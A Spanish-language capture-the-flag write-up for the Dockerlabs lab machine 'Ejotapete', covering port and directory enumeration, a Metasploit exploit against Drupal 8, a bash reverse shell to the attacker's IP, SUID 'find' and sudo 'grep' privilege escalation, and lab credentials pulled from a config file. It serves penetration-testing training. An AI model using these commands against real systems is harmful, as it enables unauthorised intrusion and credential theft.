---
layout: single
title: Ejotapete - Dockerlabs
excerpt: "Esta máquina tendrá de objetivo de descubrir unas credenciales a nivel local mediante una nota cual nos dará acceso a un share."
date: 2025-10-07
classes: wide
header:
  teaser: /assets/images/dkl-writeup-ejotapete/logo_ejpt.png
  teaser_home_page: true
  icon: /assets/images/dockerlabs.webp
categories:
  - Dockerlabs
  - Pentesting
  - eJPTv2
tags:
  - writeup
  - eJPTv2
  - HackingWeb
  - enumeración
  - Metasploit
  - ReverseShell
  - InformationLekeage
  - EscaladaPrivilegios
  - SUIDexplotation
  - Sudo
---

![](/assets/images/dkl-writeup-ejotapete/logo_ejpt.png)

"Enumeraremos directorios a nivel web para descubrir alguna pista. En este caso no encontramos algo, aunque si hay algún archivo que te dice la versión, pero vamos hacerlo al estilo eJPTv2 (faltaba enumerar más y con otras herramientas). Con *Metasploit* ejecutaremos un exploit cual nos dará acceso a comandos y de ahí nos daremos una reverse Shell. Con un permiso de SUDO podríamos ser root. Pero solo nos cambia el  uid entonces podremos ver el directorio root pero no podremos hacer nada más. En el directorio de root hay un .txt
Investigando entre los archivos de la página veremos unas credenciales cual corresponderán al usuario de la máquina.
Si listamos sus permisos de sudo tendremos la posibilidad de leer archivos arbitrarios con grep. Leeremos dicho fichero .txt y nos dará la contraseña de root."

## WRITE UP
IP VÍCITMA-> 172.17.0.2 (TTL 64) LINUX


#### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Ejotapete</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**

>**which** mkt.py | **xargs** **batcat** -l python

*Ver en que ubicación está una herramienta y ver su código*
*Adelante explicamos a tener batcat, que es un cat pero con esteroides*


Al ser dockerlabs, vamos a descargarnos el .zip y ejecutar el contenedor:

![](/assets/images/dkl-writeup-ejotapete/despdock_ejpt.png)


Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

![](/assets/images/dkl-writeup-ejotapete/whichsystem_ejpt.png)


-Usar el comando *ping* <span style="color:red">172.17.0.2</span> <span style="color:yellow">-c</span> 1  <span style="color:yellow">-R</span>
*-R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición, nos muestra el proceso.* 

![](/assets/images/dkl-writeup-ejotapete/conectividad_ejpt.png)


Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.


**nmap** <span style="color:yellow">-p- --open -Pn -vvv -n -sS --min-rate 5000</span> <span style="color:red">172.17.0.2</span> <span style="color:yellow">-oG</span> <span style="color:pink">allPorts</span>
*Veremos porque el formato grapeable, es importante.*

![](/assets/images/dkl-writeup-ejotapete/nmap1_ejpt.png)


Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

![](/assets/images/dkl-writeup-ejotapete/extractports_ejpt.png)


**nmap** <span style="color:yellow">-sVC</span>  <span style="color:yellow">-p</span><span style="color:purple">80</span> <span style="color:red">172.17.0.2</span> <span style="color:yellow">-oN</span> <span style="color:pink">targeted</span> 
*Este formato lo emplearemos con batcat lenguaje java para verlo mejor*
*Nos mostrará la versión de los servicios que están corriendo*
*Usará scripts defaults*

![](/assets/images/dkl-writeup-ejotapete/nmap2_ejpt.png)


Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

**batcat** <span style="color:pink">target</span> <span style="color:yellow">-l</span> <span style="color:orange">java</span>
*nos mostrara la salida en un formato más bonito, con java

![](/assets/images/dkl-writeup-ejotapete/batcat_ejpt.png)



#### ANÁLISIS WEB: RECONOCIMIENTO

Si entramos a la página tendremos prohibido el acceso.

![](/assets/images/dkl-writeup-ejotapete/forbren_ejpt.png)


#### ENUMERACIÓN DIRECTORIOS A NIVEL WEB

Con *gobuster* enumeraremos directorios a nivel web para encontrar algún recurso oculto.

**gobuster** <span style="color:lightpink">dir</span> <span style="color:yellow">-u</span> http://172.17.0.2/ <span style="color:yellow">-w</span> <span style="color:lightblue">/usr/share/wordlists/dirbuster</span>/directory-list-2.3-medium.txt   <span style="color:yellow">-x</span> <span style="color:grey">.php  .html .xml .zip .txt</span><span style="color:green">--no-error   -t</span> 100

Encontraremos <span style="color:lightblue">/drupal</span>

![](/assets/images/dkl-writeup-ejotapete/fuzzgob_ejpt.png)



>Sistema de Gestión de Contenidos (CMS) de código abierto que permite crear y administrar sitios web.

No nos deja interactuar con nada.

![](/assets/images/dkl-writeup-ejotapete/drupalfound_ejpt.png)


Haremos fuerza bruta otra vez, pero sobre dicha página.

**gobuster** <span style="color:lightpink">dir</span> <span style="color:yellow">-u</span> http://172.17.0.2/drupal/ <span style="color:yellow">-w</span> <span style="color:lightblue">/usr/share/wordlists/SecLists/Discovery/Web-Content</span>/directory-list-lowecase-2.3-medium.txt   <span style="color:yellow">-x</span> <span style="color:grey">.php  .html .xml .zip .txt</span><span style="color:green">--no-error   -t</span> 100

![](/assets/images/dkl-writeup-ejotapete/drupalfuzz_ejpt.png)


Con la extensión <span style="color:lightyellow">Wappalyzer</span> vemos las tecnologías de la página:

![](/assets/images/dkl-writeup-ejotapete/wappalyzer_ejpt.png)


Con *whatweb* haremos un pequeño reconocimiento a nivel web, igual al anterior pero por consola.

![](/assets/images/dkl-writeup-ejotapete/whatweb_ejpt.png)


#### METASPLOIT: EXPLOIT DRUPAL

Con *Metasploit* buscaremos **drupal** ya que tenemos una versión que es la 8.X.
Usaremos el primer exploit ya que es excelente y suele funcionar.

Buscar el exploit:
**msfconsole** > **search** <span style="color:yellow">drupal 8</span>

![](/assets/images/dkl-writeup-ejotapete/metamoddrupal_ejpt.png)


Para ver los valores a configurar: (ip víctima y URL vulnerable)
**show options** 

![](/assets/images/dkl-writeup-ejotapete/opcionsmod_ejpt.png)


Ponemos los valores y ejecutamos el exploit:
**set** valor
**run**

![](/assets/images/dkl-writeup-ejotapete/confmod_ejpt.png)


#### REVERSE SHELL

Pone que es vulnerable y recibiremos una Shell por el módulo **meterpreter**.
Nos daremos una *reverse shell* más deslimitada.

![](/assets/images/dkl-writeup-ejotapete/modeshellmeta_ejpt.png)


Nos ponemos en escucha por el <span style="color:purple">puerto 444</span> con *netcat* para cuando tengamos conexión con la víctima, recibiremos su shell en nuestor host.

![](/assets/images/dkl-writeup-ejotapete/confnc_ejpt.png)


Pondremos **bash -c "bash -i >& /dev/tcp/10.0.2.15/444 0>&1"** | o ''

![](/assets/images/dkl-writeup-ejotapete/confrevshell_ejpt.png)


Recibiendo así la shell vícitima.

![](/assets/images/dkl-writeup-ejotapete/recibirshellnc_ejpt.png)



#### SHELL INTERACTIVA | MEJORA STTY

1) **script** <span style="color:lightblue">/dev/null</span> <span style="color:green">-c</span> bash

![](/assets/images/dkl-writeup-ejotapete/tty1_ejpt.png)


2) **CTRL + Z**

![](/assets/images/dkl-writeup-ejotapete/tty2_ejpt.png)


3) **stty** <span style="color:yellow">raw</span> <span style="color:green">-echo</span><span style="color:orange">;</span> <span style="color:yellow">fg</span>

![](/assets/images/dkl-writeup-ejotapete/tty3_ejpt.png)


4) **reset** <span style="color:orange">xterm</span>

![](/assets/images/dkl-writeup-ejotapete/tty4_ejpt.png)


5) Esperamos, y **export** <span style="color:orange">TERM=xterm</span>

![](/assets/images/dkl-writeup-ejotapete/tty5_ejpt.png)


Ya tendremos una Shell totalmente interactiva.

![](/assets/images/dkl-writeup-ejotapete/tty6_ejpt.png)


#### ESCALADA PRIVILEGIOS 1

Listamos nuestros permisos de sudo, no tenemos permisos suficientes para ejecutar el comando.

![](/assets/images/dkl-writeup-ejotapete/listsudopriv_ejpt.png)


Listaremos los **SUID** que tenemos disponibles para ejecutar como root, y ver si nos podemos aprovechar de ellos.

Encontraremos uno <span style="color:lightblue">/usr/bin/</span>**find** , es vulnerable a *SUID explotation*.

**find**  <span style="color:orange">/</span> <span style="color:DeepPink">-perm -4000</span>  <span style="color:lightblue">2>/dev/null</span>

![](/assets/images/dkl-writeup-ejotapete/suidexplotation_ejpt.png)


Nos vamos al repositorio online : [GTFObins](https://gtfobins.github.io/)

<iframe src="https://gtfobins.github.io/gtfobins/find/" allow="fullscreen" allowfullscreen="" style="height: 100%; width: 100%; aspect-ratio: 4 / 3;"></iframe>

Ponemos el siguiente comando  para darnos una Shell de root:

**find** . -exec /bin/sh \; 

Nos cambiara el **guid** a root por ende tendremos permisos para entrar a directorios arbitrarios pero no a interactuar con archivos.

![](/assets/images/dkl-writeup-ejotapete/escaladafake_ejpt.png)


Entraremos a <span style="color:lightblue">root/</span> y veremos un archivo .txt


#### ESCALADA PRIVILEGIOS 2

Para ser root de verdad en la ruta <span style="color:lightblue">/var/www/html/sites/default/</span><span style="color:grey">config.php</span> filtraremos por "password" y "databases con **grep**.

![](/assets/images/dkl-writeup-ejotapete/busccred_ejpt.png)


Encontraremos las siguientes credenciales:
Nos quedaremos con la contraseña -> <span style="color:darkred">ballenitafeliz</span>

![](/assets/images/dkl-writeup-ejotapete/credencont_ejpt.png)


Veremos el home de un usuario que es <span style="color:blue">ballenita</span> cual coincide con la contraseña.

![](/assets/images/dkl-writeup-ejotapete/finduser_ejpt.png)


Probamos las credenciales, y son correctas.

**su** <span style="color:blue">ballenita</span> :<span style="color:darkred">ballenitafeliz</span>
![](/assets/images/dkl-writeup-ejotapete/loginuser_ejpt.png)


Listamos nuestros permisos de sudo, para ver si tenemos alguno disponible.

**sudo -l**

Tenemos uno con el binario **grep**

![](/assets/images/dkl-writeup-ejotapete/userlistsudopriv_ejpt.png)


> Este permiso nos hará leer archivos arbitrarios sin necesidad de ser root.

<iframe src="https://gtfobins.github.io/gtfobins/grep/#sudo" allow="fullscreen" allowfullscreen="" style="height: 100%; width: 100%; aspect-ratio: 4 / 3;"></iframe>

Poniendo el siguiente comando le diremos que queremos leer los archivos en el lugar de la variable **$LFILE**

**LFILE=file_to_read**

![](/assets/images/dkl-writeup-ejotapete/sudoprivab_ejpt.png)


Basándonos en la sintaxis -> **sudo grep '' $LFILE**
Entraremos al archivo visto anteriormente en el directorio root/ pero no podríamos leer.

**sudo grep** <span style="color:orange">''</span> <span style="color:lightblue">/root/</span><span style="color:grey">secretitomaximo.txt</span>

Conteniendo la contraseña: <span style="color:darkred">nobodycanfindthispasswordrootrocks</span>

![](/assets/images/dkl-writeup-ejotapete/usesudopriv_ejpt.png)


Si probamos las credenciales con el usuario <span style="color:blue">root</span> vemos que tenemos privilegios máximos sobre el sistema y que somos dicho usuario.

**su** <span style="color:blue">root</span> :<span style="color:darkred">nobodycanfindthispasswordrootrocks</span>

![](/assets/images/dkl-writeup-ejotapete/root2_ejpt.png)
